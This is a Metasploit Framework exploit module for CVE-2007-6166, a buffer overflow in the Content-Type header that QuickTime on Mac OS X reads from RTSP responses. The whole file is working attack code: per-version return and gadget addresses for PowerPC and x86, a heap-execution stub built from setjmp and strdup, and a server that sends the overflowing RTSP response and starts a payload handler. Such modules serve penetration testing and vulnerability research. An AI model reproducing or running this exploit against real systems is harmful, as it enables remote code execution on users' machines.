##
# $Id: quicktime_rtsp_content_type.rb 10617 2010-10-09 06:55:52Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require \'msf/core\'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::TcpServer

	def initialize(info = {})
		super(update_info(info,
			\'Name\' => \'MacOS X QuickTime RTSP Content-Type Overflow\',
			# Description?
			# Author?
			\'Version\'  => \'$Revision: 10617 $\',
			\'Platform\' => \'osx\',
			\'References\' =>
				[
					[ \'CVE\', \'2007-6166\' ],
					[ \'OSVDB\', \'40876\'],
					[ \'BID\', \'26549\' ],
				],
			\'Payload\' =>
				{
					\'Space\' => 3841,
					\'BadChars\' => \"\\x00\\x0a\\x0d\",
					\'MaxNops\' => 0,
					\'StackAdjustment\' => -3500,
				},
			\'Targets\' =>
				[
					[ \'Mac OS X 10.4.0 PowerPC, QuickTime 7.0.0\',
						{
							\'Arch\' => ARCH_PPC,
							\'Ret\' => 0x8fe3f88c,
							\'RetOffset\' => 551,
							\'PayloadOffset\' => 879
						}
					],

					[ \'Mac OS X 10.5.0 PowerPC, QuickTime 7.2.1\',
						{
							\'Arch\' => ARCH_PPC,
							\'Ret\' => 0x8fe042e0,
							\'RetOffset\' => 615,
							\'PayloadOffset\' => 3351
						}
					],

					[ \'Mac OS X 10.4.8 x86, QuickTime 7.1.3\',
						{
							\'Arch\' => ARCH_X86,
							\'Offset\' => 307,
							\'Writable\' => 0xa0bd0f10,    # libSystem __IMPORT
							# The rest of these are all in libSystem __TEXT
							\'ret\' => 0x9015d336,
							\'poppopret\' => 0x9015d334,
							\'setjmp\' => 0x900bc438,
							\'strdup\' => 0x90012f40,
							\'jmp_eax\' => 0x9014a77f
						}
					],

					[ \'Mac OS X 10.5.0 x86, QuickTime 7.2.1\',
						{
							\'Arch\' => ARCH_X86,
							\'Offset\' => 307,
							\'Writable\' => 0x8fe66448,  # dyld __IMPORT
							# The rest of these addresses are in dyld __TEXT
							\'ret\' => 0x8fe1ceee,
							\'poppopret\' => 0x8fe220d7,
							\'setjmp\' => 0x8fe1ceb0,
							\'strdup\' => 0x8fe1cd77,
							\'jmp_eax\' => 0x8fe01041
						}
					],

				],
			\'DefaultTarget\'  => 2,
			\'DisclosureDate\' => \'Nov 23 2007\'))
	end

	######
	# XXX: This does not work on Tiger apparently
	def make_exec_payload_from_heap_stub()
		frag0 =
			\"\\x90\" + # nop
			\"\\x58\" + # pop eax
			\"\\x61\" + # popa
			\"\\xc3\"   # ret

		frag1 =
			\"\\x90\" +             # nop
			\"\\x58\" +             # pop eax
			\"\\x89\\xe0\" +         # mov eax, esp
			\"\\x83\\xc0\\x0c\" +     # add eax, byte +0xc
			\"\\x89\\x44\\x24\\x08\" + # mov [esp+0x8], eax
			\"\\xc3\"               # ret

		setjmp = target[\'setjmp\']
		writable = target[\'Writable\']
		strdup = target[\'strdup\']
		jmp_eax = target[\'jmp_eax\']

		exec_payload_from_heap_stub =
			frag0 +
			[setjmp].pack(\'V\') +
			[writable + 32, writable].pack(\"V2\") +
			frag1 +
			\"X\" * 20 +
			[setjmp].pack(\'V\') +
			[writable + 24, writable, strdup, jmp_eax].pack(\"V4\") +
			\"X\" * 4
	end

	def on_client_connect(client)
		print_status(\"Got client connection...\")

		if (target[\'Arch\'] == ARCH_PPC)
			ret_offset = target[\'RetOffset\']
			payload_offset = target[\'PayloadOffset\']

			# Create pattern sized up to payload, since it always follows
			# the return address.
			boom = Rex::Text.pattern_create(payload_offset)

			boom[ret_offset, 4] = [target[\'Ret\']].pack(\'N\')
			boom[payload_offset, payload.encoded.length] = payload.encoded
		else
			boom = Rex::Text.pattern_create(327)

			boom[307, 4] = [target[\'ret\']].pack(\'V\')
			boom[311, 4] = [target[\'ret\']].pack(\'V\')
			boom[315, 4] = [target[\'poppopret\']].pack(\'V\')
			boom[319, 4] = [target[\'Writable\']].pack(\'V\')
			boom[323, 4] = [target[\'Writable\']].pack(\'V\')

			#
			# Create exec-payload-from-heap-stub, but split it in two.
			# The first word must be placed as the overwritten saved ebp
			# in the attack string.  The rest is placed after the
			# Writable memory addresses.
			#
			magic = make_exec_payload_from_heap_stub()
			boom[303, 4] = magic[0, 4]
			boom += magic[4..-1]

			#
			# Place the payload immediately after the stub as it expects
			#
			boom += payload.encoded
		end

		body = \" \"
		header =
			\"RTSP/1.0 200 OK\\r\\n\"+
			\"CSeq: 1\\r\\n\"+
			\"Content-Type: #{boom}\\r\\n\"+
			\"Content-Length: #{body.length}\\r\\n\\r\\n\"

		print_status(\"Sending RTSP response...\")
		client.put(header + body)

		print_status(\"Sleeping...\")
		select(nil,nil,nil,1)

		print_status(\"Starting handler...\")
		handler(client)

		print_status(\"Closing client...\")
		service.close_client(client)
	end
end
